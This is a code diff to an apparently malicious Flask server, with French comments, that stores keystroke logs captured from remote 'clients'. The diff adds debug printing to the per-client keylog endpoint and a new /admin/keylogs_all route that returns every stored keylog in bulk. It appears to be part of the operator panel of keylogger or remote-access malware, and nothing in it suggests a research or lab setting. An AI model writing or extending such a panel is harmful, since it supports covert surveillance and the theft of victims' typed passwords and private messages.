@@ -476,8 +476,14 @@ def get_client_keylogs(client_id):
     try:
         limit = request.args.get('limit', 100, type=int)
         
+        # Debug: afficher tous les client_ids disponibles
+        print(f"[ADMIN_KEYLOG] Requested client_id: {client_id}")
+        print(f"[ADMIN_KEYLOG] Available client_ids in storage: {list(keylogs_storage.keys())}")
+        print(f"[ADMIN_KEYLOG] Total clients with keylogs: {len(keylogs_storage)}")
+        
         if client_id in keylogs_storage:
             logs = keylogs_storage[client_id][-limit:]  # Les plus récents en premier
+            print(f"[ADMIN_KEYLOG] ✅ Found {len(logs)} keylogs for {client_id}")
             return jsonify({
                 "success": True,
                 "client_id": client_id,
@@ -486,12 +492,14 @@ def get_client_keylogs(client_id):
                 "returned_logs": len(logs)
             })
         else:
+            print(f"[ADMIN_KEYLOG] ❌ No keylogs found for {client_id}")
             return jsonify({
                 "success": True,
                 "client_id": client_id,
                 "keylogs": [],
                 "total_logs": 0,
-                "message": "No keylogs found for this client"
+                "message": "No keylogs found for this client",
+                "available_clients": list(keylogs_storage.keys())
             })
     
     except Exception as e:
@@ -523,6 +531,20 @@ def get_keylogs_stats():
     
     except Exception as e:
         return jsonify({"error": f"Failed to get keylog stats: {e}"}), 500
+
+
+# Nouvel endpoint pour debug - voir TOUS les keylogs
+@app.route("/admin/keylogs_all", methods=["GET"])
+def get_all_keylogs():
+    try:
+        return jsonify({
+            "success": True,
+            "keylogs_storage": keylogs_storage,
+            "total_clients": len(keylogs_storage),
+            "client_ids": list(keylogs_storage.keys())
+        })
+    except Exception as e:
+        return jsonify({"error": f"Failed to get all keylogs: {e}"}), 500
 
 
 def cleanup_old_keylogs():
